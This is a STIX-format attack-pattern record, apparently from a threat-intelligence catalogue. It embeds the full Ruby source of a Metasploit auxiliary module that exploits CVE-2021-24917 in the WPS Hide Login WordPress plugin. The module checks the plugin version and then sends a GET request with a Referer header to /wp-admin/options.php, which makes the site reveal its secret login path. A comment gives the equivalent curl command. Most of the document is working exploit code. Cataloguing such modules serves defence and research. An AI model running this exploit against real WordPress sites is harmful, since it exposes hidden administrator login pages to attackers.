{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26049e92-ed88-47c6-893e-0659829cc70b",
    "created": "2024-08-14T16:29:00.819603Z",
    "modified": "2024-08-14T16:29:00.819607Z",
    "name": "WordPress WPS Hide Login Login Page Revealer",
    "description": " This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login is used to make a new secret path to the login page, however a 'GET' request to '/wp-admin/options.php' with a referer will reveal the hidden path.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_wps_hide_login_revealer.rb",
            "external_id": "wp_wps_hide_login_revealer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24917"
        },
        {
            "source_name": "reference",
            "url": "https://wordpress.org/support/topic/bypass-security-issue/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress WPS Hide Login Login Page Revealer',\n        'Description' => %q{\n          This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login\n          is used to make a new secret path to the login page, however a 'GET' request to\n          '/wp-admin/options.php' with a referer will reveal the hidden path.\n        },\n        'References' => [\n          ['WPVDB', '15bb711a-7d70-4891-b7a2-c473e3e8b375'],\n          ['CVE', '2021-24917'],\n          ['URL', 'https://wordpress.org/support/topic/bypass-security-issue/']\n        ],\n        'Author' => [\n          'thalakus', # Vulnerability discovery\n          'h00die' # Metasploit module\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2021-10-27',\n        'License' => MSF_LICENSE\n      )\n    )\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      fail_with Failure::NotVulnerable, \"#{ip} - Server not online or not detected as wordpress\"\n    end\n\n    checkcode = check_plugin_version_from_readme('wps-hide-login', '1.9.1')\n    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)\n      fail_with Failure::NotVulnerable, \"#{ip} - A vulnerable version of the 'WPS Hide Login' was not found\"\n    end\n    print_good(\"#{ip} - Vulnerable version of wps_hide_login detected\")\n\n    print_status(\"#{ip} - Determining login page\")\n    # curl --referer \"something\" -sIXGET http://<ip>/wp-admin/options.php\n    res = send_request_cgi({\n      'method' => 'GET',\n      'headers' => {\n        'Referer' => Rex::Text.rand_text_alphanumeric(rand(5..7))\n      },\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options.php')\n    })\n\n    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res\n    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Didn't receive a HTTP 302 redirect to the secret login page\" if res.code != 302\n    if res.headers['Location']\n      print_good(\"Login page: #{res.headers['Location']}\")\n    else\n      print_error('No location header found')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-10-27"
}